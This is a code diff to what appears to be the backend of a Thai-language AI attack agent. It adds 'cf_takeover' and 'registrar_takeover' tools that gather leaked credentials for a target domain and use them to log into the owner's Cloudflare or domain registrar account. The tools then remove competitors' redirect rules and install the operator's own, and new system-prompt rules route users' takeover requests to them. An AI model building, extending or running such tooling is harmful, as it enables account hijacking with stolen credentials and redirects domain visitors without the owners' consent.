@@ -1231,6 +1231,44 @@ const AI_TOOLS: Tool[] = [
       },
     },
   },
+  // ─── Cloudflare Account Takeover Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "cf_takeover",
+      description: "ยึด Cloudflare account ของโดเมนเป้าหมาย — ใช้ leaked credentials/API tokens ลอง login CF API แล้วลบ redirect rule ของคู่แข่ง + วาง rule ใหม่ของเรา. ใช้เมื่อ redirect อยู่ที่ระดับ Cloudflare (Page Rules, Redirect Rules, Workers)",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนเป้าหมาย เช่น example.com" },
+          targetPath: { type: "string", description: "path ที่ต้องการ redirect เช่น /events (default: /)" },
+          redirectUrl: { type: "string", description: "URL ที่ต้องการ redirect ไป" },
+          email: { type: "string", description: "email สำหรับ login Cloudflare" },
+          password: { type: "string", description: "password หรือ API token" },
+          apiToken: { type: "string", description: "Cloudflare API token (ถ้ามี)" },
+        },
+        required: ["domain", "redirectUrl"],
+      },
+    },
+  },
+  // ─── DNS Registrar Takeover Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "registrar_takeover",
+      description: "WHOIS lookup + ยึด DNS registrar (GoDaddy, Namecheap, CF Registrar) ด้วย leaked credentials — เปลี่ยน nameservers หรือ DNS records. ใช้เมื่อ CF takeover ล้มเหลว",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนเป้าหมาย" },
+          redirectUrl: { type: "string", description: "URL ที่ต้องการ redirect ไป" },
+          email: { type: "string", description: "email สำหรับ login registrar" },
+          password: { type: "string", description: "password สำหรับ login registrar" },
+        },
+        required: ["domain", "redirectUrl"],
+      },
+    },
+  },
   // ─── Competitor Redirect Analysis Tool ───
   {
     type: "function" as const,
@@ -2105,6 +2143,129 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         return `${formatted}\n\n⏱ ${formatDuration(dur)}`;
       }
 
+      case "cf_takeover": {
+        const cfDomain = args.domain as string;
+        const cfTargetPath = (args.targetPath as string) || "/";
+        const cfRedirectUrl = args.redirectUrl as string;
+        const cfEmail = args.email as string | undefined;
+        const cfPassword = args.password as string | undefined;
+        const cfApiToken = args.apiToken as string | undefined;
+
+        const { executeCloudfareTakeover, extractCfTokensFromCredentials, detectCloudflareRedirect } = await import("./cloudflare-takeover");
+        const { extractDomainCredentials } = await import("./leakcheck-client");
+
+        // Step 1: Detect CF-level redirect
+        const cfDetection = await detectCloudflareRedirect(`https://${cfDomain}${cfTargetPath}`);
+        const cfDetectMsg = cfDetection.isCloudflareRedirect
+          ? `\u{1F329}\uFE0F CF-level redirect detected: HTTP ${cfDetection.httpStatus} \u2192 ${cfDetection.redirectUrl}`
+          : `\u2139\uFE0F Not a CF-level redirect (origin-based)`;
+
+        // Step 2: Gather credentials
+        let creds: { email: string; password: string; username?: string; source?: string }[] = [];
+        if (cfEmail && cfPassword) {
+          creds.push({ email: cfEmail, password: cfPassword });
+        }
+        // Also try LeakCheck
+        try {
+          const leakedResult = await extractDomainCredentials(cfDomain);
+          creds.push(...leakedResult.credentials.map((c: any) => ({ email: c.email, password: c.password, username: c.username, source: c.source })));
+        } catch {}
+
+        let apiTokens: string[] = [];
+        if (cfApiToken) apiTokens.push(cfApiToken);
+        apiTokens.push(...extractCfTokensFromCredentials(creds as any));
+
+        if (creds.length === 0 && apiTokens.length === 0) {
+          return `${cfDetectMsg}\n\n\u274C \u0E44\u0E21\u0E48\u0E21\u0E35 credentials \u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A\u0E25\u0E2D\u0E07 CF takeover\n\u23F1 ${formatDuration(Date.now() - startTime)}`;
+        }
+
+        // Step 3: Execute takeover
+        const logs: string[] = [cfDetectMsg];
+        const cfResult = await executeCloudfareTakeover({
+          targetUrl: `https://${cfDomain}${cfTargetPath}`,
+          targetPath: cfTargetPath,
+          ourRedirectUrl: cfRedirectUrl,
+          credentials: creds,
+          apiTokens,
+          onProgress: (_phase, detail) => logs.push(detail),
+        });
+
+        const durS = Date.now() - startTime;
+        if (cfResult.success) {
+          return `\u2705 Cloudflare Takeover \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08!\n\n` +
+            `\u{1F3AF} Domain: ${cfDomain}\n` +
+            `\u{1F527} Method: ${cfResult.method}\n` +
+            `\u{1F4DD} ${cfResult.detail}\n\n` +
+            `\u{1F4CB} Log:\n${logs.slice(-8).join("\n")}\n\n` +
+            `\u23F1 ${formatDuration(durS)}`;
+        } else {
+          return `\u274C Cloudflare Takeover \u0E25\u0E49\u0E21\u0E40\u0E2B\u0E25\u0E27\n\n` +
+            `\u{1F3AF} Domain: ${cfDomain}\n` +
+            `\u{1F4DD} ${cfResult.detail}\n\n` +
+            `\u{1F4CB} Log:\n${logs.slice(-8).join("\n")}\n\n` +
+            `\u{1F4A1} \u0E25\u0E2D\u0E07 registrar_takeover \u0E40\u0E1B\u0E47\u0E19 fallback\n` +
+            `\u23F1 ${formatDuration(durS)}`;
+        }
+      }
+
+      case "registrar_takeover": {
+        const regDomain = args.domain as string;
+        const regRedirectUrl = args.redirectUrl as string;
+        const regEmail = args.email as string | undefined;
+        const regPassword = args.password as string | undefined;
+
+        const { executeRegistrarTakeover, lookupWhois } = await import("./dns-registrar-takeover");
+        const { extractDomainCredentials: extractLeakCreds } = await import("./leakcheck-client");
+
+        // Gather credentials
+        let regCreds: { email: string; password: string; username?: string; source?: string }[] = [];
+        if (regEmail && regPassword) {
+          regCreds.push({ email: regEmail, password: regPassword });
+        }
+        try {
+          const leakedResult = await extractLeakCreds(regDomain);
+          regCreds.push(...leakedResult.credentials.map((c: any) => ({ email: c.email, password: c.password, username: c.username, source: c.source })));
+        } catch {}
+
+        if (regCreds.length === 0) {
+          // At least do WHOIS
+          const whois = await lookupWhois(regDomain);
+          return `\u{1F310} WHOIS: ${regDomain}\n\n` +
+            `Registrar: ${whois.registrar || "unknown"}\n` +
+            `NS: ${whois.nameservers.join(", ") || "unknown"}\n` +
+            `Registrant: ${whois.registrantEmail || "redacted"}\n\n` +
+            `\u274C \u0E44\u0E21\u0E48\u0E21\u0E35 credentials \u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A\u0E25\u0E2D\u0E07 registrar takeover\n` +
+            `\u23F1 ${formatDuration(Date.now() - startTime)}`;
+        }
+
+        const regLogs: string[] = [];
+        const regResult = await executeRegistrarTakeover({
+          domain: regDomain,
+          targetPath: "/",
+          ourRedirectUrl: regRedirectUrl,
+          credentials: regCreds,
+          onProgress: (_phase, detail) => regLogs.push(detail),
+        });
+
+        const regDurS = Date.now() - startTime;
+        if (regResult.success) {
+          return `\u2705 DNS Registrar Takeover \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08!\n\n` +
+            `\u{1F3AF} Domain: ${regDomain}\n` +
+            `\u{1F3E2} Registrar: ${regResult.registrar || "unknown"}\n` +
+            `\u{1F527} Method: ${regResult.method}\n` +
+            `\u{1F4DD} ${regResult.detail}\n\n` +
+            `\u{1F4CB} Log:\n${regLogs.slice(-8).join("\n")}\n\n` +
+            `\u23F1 ${formatDuration(regDurS)}`;
+        } else {
+          return `\u274C DNS Registrar Takeover \u0E25\u0E49\u0E21\u0E40\u0E2B\u0E25\u0E27\n\n` +
+            `\u{1F3AF} Domain: ${regDomain}\n` +
+            `\u{1F3E2} Registrar: ${regResult.registrar || "unknown"}\n` +
+            `\u{1F4DD} ${regResult.detail}\n\n` +
+            `\u{1F4CB} Log:\n${regLogs.slice(-8).join("\n")}\n\n` +
+            `\u23F1 ${formatDuration(regDurS)}`;
+        }
+      }
+
       case "analyze_competitor_redirect": {
         const domain = args.domain as string;
         const username = args.username as string;
@@ -2200,6 +2361,9 @@ function buildSystemPrompt(context: SystemContext): string {
 - "ssh" / "sftp" / "อัพผ่าน ssh" / "ssh upload" / "ssh key" + host/user/pass หรือ private key → เรียก ssh_upload (รองรับทั้ง password และ private key auth)
 - "ftp" / "อัพผ่าน ftp" / "ftp upload" + host/user/pass → เรียก ftp_upload
 - "วิเคราะห์ redirect" / "หา redirect คู่แข่ง" / "competitor" / "takeover redirect" / "สแกนไฟล์" / "deep scan" + domain/user/pass → เรียก analyze_competitor_redirect
+- "cloudflare" / "cf takeover" / "ยึด cloudflare" / "cf redirect" / "page rule" / "redirect rule" / "worker redirect" + domain → เรียก cf_takeover
+- "registrar" / "whois" / "nameserver" / "godaddy" / "namecheap" / "ยึด registrar" / "dns takeover" + domain → เรียก registrar_takeover
+- เมื่อพบว่า redirect อยู่ที่ระดับ Cloudflare (ไม่มี origin headers, content-length: 0) → แนะนำใช้ cf_takeover ก่อน, ถ้าล้มเหลวใช้ registrar_takeover เป็น fallback
 - user ส่งไฟล์ .txt ที่มีรายชื่อโดเมน → ระบบจะจัดการอัตโนมัติ (แสดง confirmation keyboard)
 
 ═══ เมื่อ user สั่งโจมตี ═══
